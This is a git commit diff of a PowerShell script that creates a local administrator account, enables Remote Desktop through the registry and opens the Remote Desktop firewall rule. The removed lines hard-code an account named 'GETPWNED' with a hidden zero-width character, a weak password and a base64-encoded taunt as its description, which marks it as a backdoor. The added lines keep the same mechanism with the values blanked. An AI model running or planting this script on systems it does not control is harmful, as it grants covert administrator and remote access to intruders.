c9b3a7c9c479ea79a72fd317c552459e913aab90
twi.2 <100327815+twi-2@users.noreply.github.com>
2022-06-21 12:37:22 +0200

    Changed few things

--- createAdminAcc/AdminAndRemoteDesktop.ps1
+++ createAdminAcc/AdminAndRemoteDesktop.ps1
@@ -1,10 +1,15 @@
-$E = [ADSI]"WinNT://${env:Computername}"
-$L = ConvertTo-SecureString "pass123" -AsPlainText -Force
-$A = "VGhhbmtzIGZvciB0aGUgYnVzaW5lc3MgZmlsZXM="
-$R = $E.Children | where {$_.SchemaClassName -eq 'user'} | % {$_.name[0].ToString()}
-$W = "GETPWNED​"
-if($R -contains $W) {Remove-LocalUser -Name $W}
+#Requires -RunAsAdministrator
+
+$Password = ConvertTo-SecureString '' -AsPlainText -Force
+$Username = ConvertTo-SecureString '' -AsPlainText -Force
+$Description = ConvertTo-SecureString '' -AsPlainText -Force
+
+$WinNT = [ADSI]"WinNT://${env:Computername}"
+$LocalUsers = $WinNT.Children | where {$_.SchemaClassName -eq 'user'} | % {$_.name[0].ToString()}
+if($LocalUsers -contains $Username) {Remove-LocalUser -Name $Username}
+
+New-LocalUser $Username -Password $Password -Desc $Description
+Add-LocalGroupMember -G "Administrators" -M $Username
+
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
-New-LocalUser $W -Password $L -Des $A
-Add-LocalGroupMember -G "Administrators" -M $W
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
